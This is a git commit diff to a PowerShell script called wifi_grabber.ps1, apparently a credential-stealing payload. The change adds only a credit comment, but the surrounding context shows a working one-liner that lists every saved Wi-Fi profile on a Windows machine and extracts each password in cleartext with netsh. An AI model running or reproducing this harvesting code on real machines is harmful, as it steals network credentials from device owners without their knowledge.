873bfcc4a9f53f66fe94cb7dca4ca7b7d22db83e
aljwhdlkawjd <private.contact.tomas@gmail.com>
2024-11-24 13:44:07 -0300

    Update wifi_grabber.ps1

--- wifi_grabber.ps1
+++ wifi_grabber.ps1
@@ -1,4 +1,6 @@
 ############################################################################################################################################################
+# All credits to I-Am-Jakoby
+
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
